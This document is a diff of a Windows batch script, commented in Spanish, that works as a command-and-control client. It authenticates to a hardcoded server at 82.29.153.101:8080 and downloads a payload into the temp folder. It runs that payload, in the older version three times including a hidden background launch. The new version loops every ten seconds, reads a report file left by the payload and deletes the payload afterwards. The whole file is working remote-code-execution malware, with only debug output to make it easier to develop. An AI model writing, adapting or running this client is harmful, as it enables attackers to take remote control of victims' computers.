@@ -1,101 +1,114 @@
 @echo off
-setlocal EnableDelayedExpansion
 chcp 65001 >nul
-title C2 Pure PowerShell - No Curl
+setlocal enabledelayedexpansion
+title C2 DEBUG MODE - %random%-%random%
+
+:: ========================================
+:: C2 CLIENT DEBUG - Windows BAT (VERBOSE)
+:: IP REAL: 82.29.153.101:8080
+:: ========================================
+set "C2_SERVER=http://82.29.153.101:8080"
+set "USER_ID=%random%-%random%"
+set "SLEEP_TIME=10"
+set "TEMP_PAYLOAD=%temp%\debug_payload_%USER_ID__.bat"
 
 echo.
-echo [INFO] 🔥 C2 POWERSHELL ONLY - SIN CURL/SILENCIO 🔥
+echo ╔══════════════════════════════════════╗
+echo ║        C2 DEBUG MODE v1.0             ║
+echo ║        ID: %USER_ID%                  ║
+echo ║        Server: %C2_SERVER%            ║
+echo ╚══════════════════════════════════════╝
 echo.
 
-set "BASE=http://82.29.153.101:8080"
-set "PAYLOAD=%TEMP%\payload.bat"
-set "LOG=%TEMP%\c2_pure.log"
+:MAIN_LOOP
+echo.
+echo [%date% %time%] ================================
+echo [%date% %time%] [DEBUG] INICIANDO CICLO
+echo [%date% %time%] ================================
 
-echo [DEBUG] PowerShell only mode ✓
-
-:: =====================================================
-:: [1] AUTH + PARSE (1 comando)
-:: =====================================================
-echo [INFO] [1/3] 🔑 AUTH + PARSE...
+:: PASO 1: AUTH
+echo [%date% %time%] [DEBUG] → PASO 1: Solicitando AUTH...
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
- "$ErrorActionPreference='Stop'; ^
-  try { ^
-   Write-Host '[DEBUG] AUTH...'; ^
-   $auth = iwr '%BASE%/auth/key' -UseBasicParsing -TimeoutSec 10; ^
-   $json = $auth.Content | ConvertFrom-Json; ^
-   $nonce = $json.nonce; $token = $json.token; ^
-   Write-Host ('[DEBUG] NONCE=' + $nonce); ^
-   Write-Host ('[DEBUG] TOKEN=' + $token.Substring(0,10) + '...'); ^
-   ^
-   Write-Host '[DEBUG] DOWNLOAD...'; ^
-   $h = @{ 'X-Nonce'=$nonce; 'X-Token'=$token }; ^
-   $payload = iwr '%BASE%/payload/encrypted' -Headers $h -UseBasicParsing -TimeoutSec 15; ^
-   $payload.Content | Out-File '%PAYLOAD%' UTF8; ^
-   Write-Host ('[DEBUG] SIZE=' + $payload.Content.Length + 'bytes'); ^
-   exit 0 ^
-  } catch { ^
-   Write-Error $_.Exception.Message; exit 1 ^
-  }"
+"Write-Host '[DEBUG] PowerShell AUTH ejecutándose...'; ^
+$req = Invoke-WebRequest -Uri '%C2_SERVER%/auth/key' -UseBasicParsing -Verbose 2>&1; ^
+Write-Host '[DEBUG] Respuesta HTTP recibida'; ^
+$json = $req.Content ^| ConvertFrom-Json; ^
+Write-Host ('[DEBUG] Nonce: ' + $json.nonce); ^
+Write-Host ('[DEBUG] Token: ' + $json.token); ^
+[Environment]::SetEnvironmentVariable('NONCE', $json.nonce, 'Process'); ^
+[Environment]::SetEnvironmentVariable('TOKEN', $json.token, 'Process'); ^
+[Console]::WriteLine('NONCE_OK=' + $json.nonce); ^
+[Console]::WriteLine('TOKEN_OK=' + $json.token)" 
 
-if %ERRORLEVEL% neq 0 (
-    echo [ERROR] POWERSHELL FAIL - Revisa red/firewall
-    goto :fail
+echo [%date% %time%] [DEBUG] ← Auth completado
+echo [%date% %time%] [DEBUG] Nonce: %NONCE%
+echo [%date% %time%] [DEBUG] Token: %TOKEN%
+if not defined NONCE (
+    echo [%date% %time%] [ERROR] Auth falló, reintentando...
+    goto SLEEP_RETRY
 )
 
-:: =====================================================
-:: [2] VALIDATE + PREVIEW
-:: =====================================================
-if not exist "%PAYLOAD%" (
-    echo [ERROR] PAYLOAD NO CREADO
-    goto :fail
+:: PASO 2: PAYLOAD
+echo.
+echo [%date% %time%] [DEBUG] → PASO 2: Descargando PAYLOAD...
+echo [%date% %time%] [DEBUG] Headers: X-Nonce=%NONCE% X-Token=%TOKEN%
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Write-Host '[DEBUG] PowerShell PAYLOAD ejecutándose...'; ^
+Write-Host ('[DEBUG] Enviando Nonce: ' + '${env:NONCE}'); ^
+Write-Host ('[DEBUG] Enviando Token: ' + '${env:TOKEN}'); ^
+$headers = @{ 'X-Nonce' = '${env:NONCE}'; 'X-Token' = '${env:TOKEN}' }; ^
+Write-Host '[DEBUG] Headers preparados'; ^
+try { ^
+    Write-Host '[DEBUG] Request a /payload/encrypted...'; ^
+    $resp = Invoke-WebRequest -Uri '%C2_SERVER%/payload/encrypted' -Headers $headers -UseBasicParsing; ^
+    Write-Host ('[DEBUG] Status: ' + $resp.StatusCode); ^
+    Write-Host ('[DEBUG] Content-Type: ' + $resp.Headers['Content-Type']); ^
+    Write-Host ('[DEBUG] Content-Length: ' + $resp.Content.Length); ^
+    Write-Host '[DEBUG] Contenido descargado:'; ^
+    $resp.Content; ^
+    Write-Host '[DEBUG] Guardando en temp...'; ^
+    $resp.Content ^| Out-File -FilePath '%TEMP_PAYLOAD%' -Encoding UTF8; ^
+    Write-Host ('[DEBUG] Archivo guardado: %TEMP_PAYLOAD%'); ^
+    [Console]::WriteLine('PAYLOAD_OK=LISTO'); ^
+} catch { ^
+    Write-Host ('[ERROR] ' + $_.Exception.Message); ^
+    exit 1 ^
+}" 2>&1
+
+if errorlevel 1 (
+    echo [%date% %time%] [ERROR] Falló descarga payload
+    goto SLEEP_RETRY
 )
 
-for %%F in ("%PAYLOAD%") do (
-    echo [INFO] [2/3] 📁 PAYLOAD ✓ %%~zF bytes
-    if %%~zF LSS 1 echo [ERROR] VACÍO && goto :fail
+:: PASO 3: EJECUTAR PAYLOAD
+echo.
+echo [%date% %time%] [DEBUG] → PASO 3: Ejecutando payload...
+echo [%date% %time%] [DEBUG] Archivo: %TEMP_PAYLOAD%
+echo [%date% %time%] [DEBUG] CONTENIDO DEL PAYLOAD:
+type "%TEMP_PAYLOAD%"
+echo.
+echo [%date% %time%] [DEBUG] ──────────────────────────
+echo [%date% %time%] [DEBUG] 👇 EJECUTANDO PAYLOAD 👇
+echo [%date% %time%] [DEBUG] ──────────────────────────
+call "%TEMP_PAYLOAD%"
+echo.
+echo [%date% %time%] [DEBUG] ──────────────────────────
+echo [%date% %time%] [DEBUG] ✅ Payload ejecutado
+echo [%date% %time%] [DEBUG] Verificando reporte...
+if exist "%temp%\c2_report.txt" (
+    echo [%date% %time%] [INFO] 📄 REPORTE ENCONTRADO:
+    type "%temp%\c2_report.txt"
+    echo.
 )
 
-echo [DEBUG] CONTENIDO:
-echo ========================================
-type "%PAYLOAD%"
-echo ========================================
+:: LIMPIEZA
+del "%TEMP_PAYLOAD%" 2>nul
+echo [%date% %time%] [DEBUG] 🧹 Limpieza completada
+
+:SLEEP_RETRY
 echo.
-
-:: =====================================================
-:: [3] EJECUCIÓN MÚLTIPLE - REAL
-:: =====================================================
-echo [INFO] [3/3] 🚀 EJECUTANDO x3...
+echo [%date% %time%] [DEBUG] ⏳ Esperando %SLEEP_TIME% segundos...
+timeout /t %SLEEP_TIME% /nobreak
 echo.
-
-echo 🔥 MÉTODO 1: call directo
-call "%PAYLOAD%"
-
-echo 🔥 MÉTODO 2: cmd /c (contexto limpio)
-cmd /c "%PAYLOAD%"
-
-echo 🔥 MÉTODO 3: background persistente
-start /min cmd /c "%PAYLOAD%"
-
-echo.
-echo [SUCCESS] 🎉 3 EJECUCIONES COMPLETADAS 🎉
-echo [INFO] Payload queda: %PAYLOAD%
-echo.
-
-goto :success
-
-:fail
-echo [FAIL] ❌ ERROR EN DOWNLOAD/AUTH
-echo [TIP] Verifica:
-echo  - Firewall Windows
-echo  - Proxy corporativo  
-echo  - Antivirus bloqueando
-echo  - Puerto 8080 abierto
-pause
-exit /b 1
-
-:success
-echo [INFO] Presiona para salir...
-pause >nul
-
-:: CLEANUP OPCIONAL
-REM del "%PAYLOAD%" 2>nul
+goto MAIN_LOOP
